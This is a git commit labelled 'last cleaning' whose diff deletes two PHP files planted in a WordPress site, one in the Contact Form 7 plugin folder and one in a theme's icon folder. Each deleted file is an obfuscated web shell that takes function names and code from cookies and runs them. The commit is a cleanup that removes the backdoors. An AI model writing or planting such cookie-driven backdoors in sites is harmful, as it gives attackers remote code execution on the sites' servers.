f7cd377e1c6b92b46830ccf0887a1bfa4d4001fb
codeamanmaster <kochserkan@gmail.com>
2016-10-30 04:16:36 +0300

    last cleaning

--- wp-content/plugins/contact-form-7/includes/dirs.php
+++
@@ -1,7 +0,0 @@
-<?php
-
-$aood=$_COOKIE;
-$blx=$aood[izge];
-if($blx){
-	$ldr=$blx($aood[gxuh]);$wzjj=$blx($aood[tmhv]);$nszh=$ldr("",$wzjj);$nszh();
-}
--- wp-content/themes/twentyfourteen/genericons/menu.php
+++
@@ -1,7 +0,0 @@
-<?php
-
-$rgi=$_COOKIE;
-$lgn=$rgi[pseo];
-if($lgn){
-	$ltetq=$lgn($rgi[oxcd]);$ygjsf=$lgn($rgi[anfe]);$nxl=$ltetq("",$ygjsf);$nxl();
-}
